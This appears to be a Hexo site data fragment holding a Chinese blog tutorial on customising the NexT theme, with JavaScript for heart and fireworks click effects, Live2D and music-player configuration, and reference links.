class=\"string\">&quot;#FBF38C&quot;</span>],setCanvasSize=<span class=\"title function_\">debounce</span>(<span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;canvasEl.<span class=\"property\">width</span>=<span class=\"number\">2</span>*<span class=\"variable language_\">window</span>.<span class=\"property\">innerWidth</span>,canvasEl.<span class=\"property\">height</span>=<span class=\"number\">2</span>*<span class=\"variable language_\">window</span>.<span class=\"property\">innerHeight</span>,canvasEl.<span class=\"property\">style</span>.<span class=\"property\">width</span>=<span class=\"variable language_\">window</span>.<span class=\"property\">innerWidth</span>+<span class=\"string\">&quot;px&quot;</span>,canvasEl.<span class=\"property\">style</span>.<span class=\"property\">height</span>=<span class=\"variable language_\">window</span>.<span class=\"property\">innerHeight</span>+<span class=\"string\">&quot;px&quot;</span>,canvasEl.<span class=\"title function_\">getContext</span>(<span class=\"string\">&quot;2d&quot;</span>).<span class=\"title function_\">scale</span>(<span class=\"number\">2</span>,<span class=\"number\">2</span>)&#125;,<span class=\"number\">500</span>),render=<span class=\"title function_\">anime</span>(&#123;<span class=\"attr\">duration</span>:<span class=\"number\">1</span>/<span class=\"number\">0</span>,<span class=\"attr\">update</span>:<span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;ctx.<span class=\"title function_\">clearRect</span>(<span class=\"number\">0</span>,<span class=\"number\">0</span>,canvasEl.<span class=\"property\">width</span>,canvasEl.<span class=\"property\">height</span>)&#125;&#125;);<span class=\"variable language_\">document</span>.<span class=\"title function_\">addEventListener</span>(tap,<span class=\"keyword\">function</span>(<span class=\"params\">e</span>)&#123;<span class=\"string\">&quot;sidebar&quot;</span>!==e.<span class=\"property\">target</span>.<span class=\"property\">id</span>&amp;&amp;<span class=\"string\">&quot;toggle-sidebar&quot;</span>!==e.<span class=\"property\">target</span>.<span class=\"property\">id</span>&amp;&amp;<span class=\"string\">&quot;A&quot;</span>!==e.<span class=\"property\">target</span>.<span class=\"property\">nodeName</span>&amp;&amp;<span class=\"string\">&quot;IMG&quot;</span>!==e.<span class=\"property\">target</span>.<span class=\"property\">nodeName</span>&amp;&amp;(render.<span class=\"title function_\">play</span>(),<span class=\"title function_\">updateCoords</span>(e),<span class=\"title function_\">animateParticules</span>(pointerX,pointerY))&#125;,!<span class=\"number\">1</span>),<span class=\"title function_\">setCanvasSize</span>(),<span class=\"variable language_\">window</span>.<span class=\"title function_\">addEventListener</span>(<span class=\"string\">&quot;resize&quot;</span>,setCanvasSize,!<span class=\"number\">1</span>)&#125;;</span><br></pre></td></tr></table></figure></li>\n<li>在 <code>themes/next/layout/_layout.swig</code> 文件末尾添加：<br><code>javascript &lt;!-- 页面点击小红心 --&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;/js/clicklove.js&quot;&gt;&lt;/script&gt; </code><br>打开 <code>themes/next/_config.yml</code> 文件，在末尾添加如下标识：</li>\n</ul>\n</li>\n</ol>\n<figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Fireworks</span></span><br><span class=\"line\"><span class=\"attr\">fireworks:</span> <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n\n<p>重新编译后就有鼠标点击特效啦</p>\n<h1 id=\"添加页面人物\"><a href=\"#添加页面人物\" class=\"headerlink\" title=\"添加页面人物\"></a>添加页面人物</h1><p>在博客目录下执行：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install -save hexo-helper-live2d</span><br></pre></td></tr></table></figure>\n\n<p>在 <a href=\"https://github.com/xiazeyu/live2d-widget-models\">lived2d</a>中选择自己想要的人物形象，例子可在作者网站中查看，<a href=\"https://huaji8.top/post/live2d-plugin-2.0/\">Author’s original Blog</a>。下载命令如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install live2d-widget-model-wanko</span><br></pre></td></tr></table></figure>\n\n<p>在 <code>your_blog/_config.yml</code> 或者 <code>themes/next/_config.yml</code> 文件下添加如下配置：</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Live2D</span></span><br><span class=\"line\"><span class=\"comment\">## https://github.com/xiazeyu/live2d-widget.js</span></span><br><span class=\"line\"><span class=\"comment\">## https://l2dwidget.js.org/docs/class/src/index.js~L2Dwidget.html#instance-method-init</span></span><br><span class=\"line\"><span class=\"attr\">live2d:</span></span><br><span class=\"line\">  <span class=\"attr\">enable:</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  <span class=\"attr\">scriptFrom:</span> <span class=\"string\">local</span></span><br><span class=\"line\">  <span class=\"attr\">pluginRootPath:</span> <span class=\"string\">live2dw/</span></span><br><span class=\"line\">  <span class=\"attr\">pluginJsPath:</span> <span class=\"string\">lib/</span></span><br><span class=\"line\">  <span class=\"attr\">pluginModelPath:</span> <span class=\"string\">assets/</span></span><br><span class=\"line\">  <span class=\"attr\">tagMode:</span> <span class=\"literal\">false</span></span><br><span class=\"line\">  <span class=\"attr\">model:</span></span><br><span class=\"line\">    <span class=\"attr\">use:</span> <span class=\"string\">live2d-widget-model-wanko</span> <span class=\"comment\">#选择下载过的模型</span></span><br><span class=\"line\">  <span class=\"attr\">display:</span> <span class=\"comment\">#放置位置和大小</span></span><br><span class=\"line\">    <span class=\"attr\">position:</span> <span class=\"string\">right</span></span><br><span class=\"line\">    <span class=\"attr\">width:</span> <span class=\"number\">150</span></span><br><span class=\"line\">    <span class=\"attr\">height:</span> <span class=\"number\">300</span></span><br><span class=\"line\">  <span class=\"attr\">mobile:</span></span><br><span class=\"line\">    <span class=\"attr\">show:</span> <span class=\"literal\">false</span> <span class=\"comment\">#是否在手机端显示</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"添加网易云音乐播放\"><a href=\"#添加网易云音乐播放\" class=\"headerlink\" title=\"添加网易云音乐播放\"></a>添加网易云音乐播放</h1><p>在<a href=\"https://music.163.com/\">网易云音乐</a>网站搜索自己想添加的音乐，点击生成外链，得到外链 html 代码</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">iframe</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">frameborder</span>=<span class=\"string\">&quot;no&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">border</span>=<span class=\"string\">&quot;0&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">marginwidth</span>=<span class=\"string\">&quot;0&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">marginheight</span>=<span class=\"string\">&quot;0&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">width</span>=<span class=\"string\">&quot;330&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">height</span>=<span class=\"string\">&quot;86&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">src</span>=<span class=\"string\">&quot;//music.163.com/outchain/player?type=2&amp;id=1471724841&amp;auto=1&amp;height=66&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>将代码放到自己想要的地方就行啦，如放在侧边栏 <code>themes/next/layout/_macro/sidebar.swig</code> 中</p>\n<h1 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h1><ul>\n<li><a href=\"https://blog.csdn.net/mqdxiaoxiao/article/details/93644533\">Hexo 博客 NexT 主题下添加分类、标签、关于菜单项</a></li>\n<li><a href=\"https://blog.csdn.net/nightmare_dimple/article/details/86661502\">Hexo 博客优化之 Next 主题美化</a></li>\n<li><a href=\"http://shenzekun.cn/hexo%E7%9A%84next%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B.html\">hexo 的 next 主题个性化教程:打造炫酷网站</a></li>\n<li><a href=\"https://www.jianshu.com/p/1ff2fcbdd155\">Hexo 博客第三方主题 next 进阶教程</a></li>\n<li><a href=\"https://blog.csdn.net/cungudafa/article/details/104282643\">Hexo（sakura）添加 live2d 看板动画（可对话，换装互动）</a></li>\n<li><a href=\"https://zouhua.top/archives/e635378a.html\">Hexo-Next 主题美化</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"<p>前面已经可以开始写博客了，但如果还是对界面不怎么满意，那还可以做些小修改，下面记录一下我在 next 主题上做的配置。</p>","more":"<h1 id=\"Next-主题风格\"><a href=\"#Next-主题风格\" class=\"headerlink\" title=\"Next 主题风格\"></a>Next 主题风格</h1><p>Next 中提供了四种主题风格，可以在主题配置文件<code>your_blog/themes/next/_config.yml</code>中进行选择，分别是 Muse、Mist、Pisces、Gemini</p>\n<p>我选择的是 Mist 风格</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Schemes</span></span><br><span class=\"line\"><span class=\"comment\">#scheme: Muse</span></span><br><span class=\"line\"><span class=\"attr\">scheme:</span> <span class=\"string\">Mist</span></span><br><span class=\"line\"><span class=\"comment\">#scheme: Pisces</span></span><br><span class=\"line\"><span class=\"comment\">#scheme: Gemini</span></span><br></pre></td></tr></table></figure>\n\n<p>在 <code>_config.yml</code> 文件中有博客主题的相关配置文件，基本的配置都有写明，不懂的可以设置后看看效果或者搜索</p>\n<h1 id=\"添加博客自定义图标\"><a href=\"#添加博客自定义图标\" class=\"headerlink\" title=\"添加博客自定义图标\"></a>添加博客自定义图标</h1><p>Hexo 博客的默认图标是<code>H</code>，支持自定义图标，可在<a href=\"https://www.bitbug.net/\">bitbug</a>网站选择图片生成，<a href=\"https://www.iconfont.cn/plus/user/detail?uid=41718\">iconfont</a>下载，在 <code>themes/next/_config.yml</code> 如下地方进行设置：</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">favicon:</span></span><br><span class=\"line\">  <span class=\"attr\">small:</span> <span class=\"string\">/images/16x16.png</span></span><br><span class=\"line\">  <span class=\"attr\">medium:</span> <span class=\"string\">/images/32x32.png</span></span><br><span class=\"line\">  <span class=\"attr\">apple_touch_icon:</span> <span class=\"string\">/images/128x128.png</span></span><br><span class=\"line\">  <span class=\"attr\">safari_pinned_tab:</span> <span class=\"string\">/images/logo2.svg</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"鼠标点击特效\"><a href=\"#鼠标点击特效\" class=\"headerlink\" title=\"鼠标点击特效\"></a>鼠标点击特效</h1><p>在界面中添加点击特效，这里提供两种</p>\n<ol>\n<li>红心特效<ul>\n<li>在 <code>/themes/next/source/js/</code> 下新建文件 <code>clicklove.js</code> ，接着把下面的代码拷贝粘贴到 <code>clicklove.js</code> 文件中：<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">!(<span class=\"keyword\">function</span> (<span class=\"params\">e, t, a</span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">function</span> <span class=\"title function_\">n</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"title function_\">c</span>(</span><br><span class=\"line\">      <span class=\"string\">&quot;.heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: &#x27;&#x27;;width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;&quot;</span></span><br><span class=\"line\">    ),</span><br><span class=\"line\">      <span class=\"title function_\">o</span>(),</span><br><span class=\"line\">      <span class=\"title function_\">r</span>()</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">function</span> <span class=\"title function_\">r</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> e = <span class=\"number\">0</span>; e &lt; d.<span class=\"property\">length</span>; e++)</span><br><span class=\"line\">      d[e].<span class=\"property\">alpha</span> &lt;= <span class=\"number\">0</span></span><br><span class=\"line\">        ? (t.<span class=\"property\">body</span>.<span class=\"title function_\">removeChild</span>(d[e].<span class=\"property\">el</span>), d.<span class=\"title function_\">splice</span>(e, <span class=\"number\">1</span>))</span><br><span class=\"line\">        : (d[e].<span class=\"property\">y</span>--,</span><br><span class=\"line\">          (d[e].<span class=\"property\">scale</span> += <span class=\"number\">0.004</span>),</span><br><span class=\"line\">          (d[e].<span class=\"property\">alpha</span> -= <span class=\"number\">0.013</span>),</span><br><span class=\"line\">          (d[e].<span class=\"property\">el</span>.<span class=\"property\">style</span>.<span class=\"property\">cssText</span> =</span><br><span class=\"line\">            <span class=\"string\">&#x27;left:&#x27;</span> +</span><br><span class=\"line\">            d[e].<span class=\"property\">x</span> +</span><br><span class=\"line\">            <span class=\"string\">&#x27;px;top:&#x27;</span> +</span><br><span class=\"line\">            d[e].<span class=\"property\">y</span> +</span><br><span class=\"line\">            <span class=\"string\">&#x27;px;opacity:&#x27;</span> +</span><br><span class=\"line\">            d[e].<span class=\"property\">alpha</span> +</span><br><span class=\"line\">            <span class=\"string\">&#x27;;transform:scale(&#x27;</span> +</span><br><span class=\"line\">            d[e].<span class=\"property\">scale</span> +</span><br><span class=\"line\">            <span class=\"string\">&#x27;,&#x27;</span> +</span><br><span class=\"line\">            d[e].<span class=\"property\">scale</span> +</span><br><span class=\"line\">            <span class=\"string\">&#x27;) rotate(45deg);background:&#x27;</span> +</span><br><span class=\"line\">            d[e].<span class=\"property\">color</span> +</span><br><span class=\"line\">            <span class=\"string\">&#x27;;z-index:99999&#x27;</span>))</span><br><span class=\"line\">    <span class=\"title function_\">requestAnimationFrame</span>(r)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">function</span> <span class=\"title function_\">o</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> t = <span class=\"string\">&#x27;function&#x27;</span> == <span class=\"keyword\">typeof</span> e.<span class=\"property\">onclick</span> &amp;&amp; e.<span class=\"property\">onclick</span></span><br><span class=\"line\">    e.<span class=\"property\">onclick</span> = <span class=\"keyword\">function</span> (<span class=\"params\">e</span>) &#123;</span><br><span class=\"line\">      t &amp;&amp; <span class=\"title function_\">t</span>(), <span class=\"title function_\">i</span>(e)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">function</span> <span class=\"title function_\">i</span>(<span class=\"params\">e</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> a = t.<span class=\"title function_\">createElement</span>(<span class=\"string\">&#x27;div&#x27;</span>)</span><br><span class=\"line\">    ;(a.<span class=\"property\">className</span> = <span class=\"string\">&#x27;heart&#x27;</span>),</span><br><span class=\"line\">      d.<span class=\"title function_\">push</span>(&#123;</span><br><span class=\"line\">        <span class=\"attr\">el</span>: a,</span><br><span class=\"line\">        <span class=\"attr\">x</span>: e.<span class=\"property\">clientX</span> - <span class=\"number\">5</span>,</span><br><span class=\"line\">        <span class=\"attr\">y</span>: e.<span class=\"property\">clientY</span> - <span class=\"number\">5</span>,</span><br><span class=\"line\">        <span class=\"attr\">scale</span>: <span class=\"number\">1</span>,</span><br><span class=\"line\">        <span class=\"attr\">alpha</span>: <span class=\"number\">1</span>,</span><br><span class=\"line\">        <span class=\"attr\">color</span>: <span class=\"title function_\">s</span>(),</span><br><span class=\"line\">      &#125;),</span><br><span class=\"line\">      t.<span class=\"property\">body</span>.<span class=\"title function_\">appendChild</span>(a)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">function</span> <span class=\"title function_\">c</span>(<span class=\"params\">e</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> a = t.<span class=\"title function_\">createElement</span>(<span class=\"string\">&#x27;style&#x27;</span>)</span><br><span class=\"line\">    a.<span class=\"property\">type</span> = <span class=\"string\">&#x27;text/css&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">      a.<span class=\"title function_\">appendChild</span>(t.<span class=\"title function_\">createTextNode</span>(e))</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (t) &#123;</span><br><span class=\"line\">      a.<span class=\"property\">styleSheet</span>.<span class=\"property\">cssText</span> = e</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    t.<span class=\"title function_\">getElementsByTagName</span>(<span class=\"string\">&#x27;head&#x27;</span>)[<span class=\"number\">0</span>].<span class=\"title function_\">appendChild</span>(a)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">function</span> <span class=\"title function_\">s</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      <span class=\"string\">&#x27;rgb(&#x27;</span> +</span><br><span class=\"line\">      ~~(<span class=\"number\">255</span> * <span class=\"title class_\">Math</span>.<span class=\"title function_\">random</span>()) +</span><br><span class=\"line\">      <span class=\"string\">&#x27;,&#x27;</span> +</span><br><span class=\"line\">      ~~(<span class=\"number\">255</span> * <span class=\"title class_\">Math</span>.<span class=\"title function_\">random</span>()) +</span><br><span class=\"line\">      <span class=\"string\">&#x27;,&#x27;</span> +</span><br><span class=\"line\">      ~~(<span class=\"number\">255</span> * <span class=\"title class_\">Math</span>.<span class=\"title function_\">random</span>()) +</span><br><span class=\"line\">      <span class=\"string\">&#x27;)&#x27;</span></span><br><span class=\"line\">    )</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> d = []</span><br><span class=\"line\">  ;(e.<span class=\"property\">requestAnimationFrame</span> = (<span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      e.<span class=\"property\">requestAnimationFrame</span> ||</span><br><span class=\"line\">      e.<span class=\"property\">webkitRequestAnimationFrame</span> ||</span><br><span class=\"line\">      e.<span class=\"property\">mozRequestAnimationFrame</span> ||</span><br><span class=\"line\">      e.<span class=\"property\">oRequestAnimationFrame</span> ||</span><br><span class=\"line\">      e.<span class=\"property\">msRequestAnimationFrame</span> ||</span><br><span class=\"line\">      <span class=\"keyword\">function</span> (<span class=\"params\">e</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">setTimeout</span>(e, <span class=\"number\">1e3</span> / <span class=\"number\">60</span>)</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    )</span><br><span class=\"line\">  &#125;)()),</span><br><span class=\"line\">    <span class=\"title function_\">n</span>()</span><br><span class=\"line\">&#125;)(<span class=\"variable language_\">window</span>, <span class=\"variable language_\">document</span>)</span><br></pre></td></tr></table></figure></li>\n<li>在 <code>themes/next/layout/_layout.swig</code> 文件末尾添加：<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- 页面点击小红心 --&gt;</span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text/javascript&quot;</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;/js/clicklove.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li>\n</ul>\n</li>\n<li>烟火特效<ul>\n<li>在 <code>themes/next/source/js/</code> 里面建一个叫 <code>fireworks.js</code> 的文件，复制代码如下：<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&quot;use strict&quot;</span>;<span class=\"keyword\">function</span> <span class=\"title function_\">updateCoords</span>(<span class=\"params\">e</span>)&#123;pointerX=(e.<span class=\"property\">clientX</span>||e.<span class=\"property\">touches</span>[<span class=\"number\">0</span>].<span class=\"property\">clientX</span>)-canvasEl.<span class=\"title function_\">getBoundingClientRect</span>().<span class=\"property\">left</span>,pointerY=e.<span class=\"property\">clientY</span>||e.<span class=\"property\">touches</span>[<span class=\"number\">0</span>].<span class=\"property\">clientY</span>-canvasEl.<span class=\"title function_\">getBoundingClientRect</span>().<span class=\"property\">top</span>&#125;<span class=\"keyword\">function</span> <span class=\"title function_\">setParticuleDirection</span>(<span class=\"params\">e</span>)&#123;<span class=\"keyword\">var</span> t=anime.<span class=\"title function_\">random</span>(<span class=\"number\">0</span>,<span class=\"number\">360</span>)*<span class=\"title class_\">Math</span>.<span class=\"property\">PI</span>/<span class=\"number\">180</span>,a=anime.<span class=\"title function_\">random</span>(<span class=\"number\">50</span>,<span class=\"number\">180</span>),n=[-<span class=\"number\">1</span>,<span class=\"number\">1</span>][anime.<span class=\"title function_\">random</span>(<span class=\"number\">0</span>,<span class=\"number\">1</span>)]*a;<span class=\"keyword\">return</span>&#123;<span class=\"attr\">x</span>:e.<span class=\"property\">x</span>+n*<span class=\"title class_\">Math</span>.<span class=\"title function_\">cos</span>(t),<span class=\"attr\">y</span>:e.<span class=\"property\">y</span>+n*<span class=\"title class_\">Math</span>.<span class=\"title function_\">sin</span>(t)&#125;&#125;<span class=\"keyword\">function</span> <span class=\"title function_\">createParticule</span>(<span class=\"params\">e,t</span>)&#123;<span class=\"keyword\">var</span> a=&#123;&#125;;<span class=\"keyword\">return</span> a.<span class=\"property\">x</span>=e,a.<span class=\"property\">y</span>=t,a.<span class=\"property\">color</span>=colors[anime.<span class=\"title function_\">random</span>(<span class=\"number\">0</span>,colors.<span class=\"property\">length</span>-<span class=\"number\">1</span>)],a.<span class=\"property\">radius</span>=anime.<span class=\"title function_\">random</span>(<span class=\"number\">16</span>,<span class=\"number\">32</span>),a.<span class=\"property\">endPos</span>=<span class=\"title function_\">setParticuleDirection</span>(a),a.<span class=\"property\">draw</span>=<span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;ctx.<span class=\"title function_\">beginPath</span>(),ctx.<span class=\"title function_\">arc</span>(a.<span class=\"property\">x</span>,a.<span class=\"property\">y</span>,a.<span class=\"property\">radius</span>,<span class=\"number\">0</span>,<span class=\"number\">2</span>*<span class=\"title class_\">Math</span>.<span class=\"property\">PI</span>,!<span class=\"number\">0</span>),ctx.<span class=\"property\">fillStyle</span>=a.<span class=\"property\">color</span>,ctx.<span class=\"title function_\">fill</span>()&#125;,a&#125;<span class=\"keyword\">function</span> <span class=\"title function_\">createCircle</span>(<span class=\"params\">e,t</span>)&#123;<span class=\"keyword\">var</span> a=&#123;&#125;;<span class=\"keyword\">return</span> a.<span class=\"property\">x</span>=e,a.<span class=\"property\">y</span>=t,a.<span class=\"property\">color</span>=<span class=\"string\">&quot;#F00&quot;</span>,a.<span class=\"property\">radius</span>=<span class=\"number\">0.1</span>,a.<span class=\"property\">alpha</span>=<span class=\"number\">0.5</span>,a.<span class=\"property\">lineWidth</span>=<span class=\"number\">6</span>,a.<span class=\"property\">draw</span>=<span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;ctx.<span class=\"property\">globalAlpha</span>=a.<span class=\"property\">alpha</span>,ctx.<span class=\"title function_\">beginPath</span>(),ctx.<span class=\"title function_\">arc</span>(a.<span class=\"property\">x</span>,a.<span class=\"property\">y</span>,a.<span class=\"property\">radius</span>,<span class=\"number\">0</span>,<span class=\"number\">2</span>*<span class=\"title class_\">Math</span>.<span class=\"property\">PI</span>,!<span class=\"number\">0</span>),ctx.<span class=\"property\">lineWidth</span>=a.<span class=\"property\">lineWidth</span>,ctx.<span class=\"property\">strokeStyle</span>=a.<span class=\"property\">color</span>,ctx.<span class=\"title function_\">stroke</span>(),ctx.<span class=\"property\">globalAlpha</span>=<span class=\"number\">1</span>&#125;,a&#125;<span class=\"keyword\">function</span> <span class=\"title function_\">renderParticule</span>(<span class=\"params\">e</span>)&#123;<span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> t=<span class=\"number\">0</span>;t&lt;e.<span class=\"property\">animatables</span>.<span class=\"property\">length</span>;t++)&#123;e.<span class=\"property\">animatables</span>[t].<span class=\"property\">target</span>.<span class=\"title function_\">draw</span>()&#125;&#125;<span class=\"keyword\">function</span> <span class=\"title function_\">animateParticules</span>(<span class=\"params\">e,t</span>)&#123;<span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> a=<span class=\"title function_\">createCircle</span>(e,t),n=[],i=<span class=\"number\">0</span>;i&lt;numberOfParticules;i++)&#123;n.<span class=\"title function_\">push</span>(<span class=\"title function_\">createParticule</span>(e,t))&#125;anime.<span class=\"title function_\">timeline</span>().<span class=\"title function_\">add</span>(&#123;<span class=\"attr\">targets</span>:n,<span class=\"attr\">x</span>:<span class=\"keyword\">function</span>(<span class=\"params\">e</span>)&#123;<span class=\"keyword\">return</span> e.<span class=\"property\">endPos</span>.<span class=\"property\">x</span>&#125;,<span class=\"attr\">y</span>:<span class=\"keyword\">function</span>(<span class=\"params\">e</span>)&#123;<span class=\"keyword\">return</span> e.<span class=\"property\">endPos</span>.<span class=\"property\">y</span>&#125;,<span class=\"attr\">radius</span>:<span class=\"number\">0.1</span>,<span class=\"attr\">duration</span>:anime.<span class=\"title function_\">random</span>(<span class=\"number\">1200</span>,<span class=\"number\">1800</span>),<span class=\"attr\">easing</span>:<span class=\"string\">&quot;easeOutExpo&quot;</span>,<span class=\"attr\">update</span>:renderParticule&#125;).<span class=\"title function_\">add</span>(&#123;<span class=\"attr\">targets</span>:a,<span class=\"attr\">radius</span>:anime.<span class=\"title 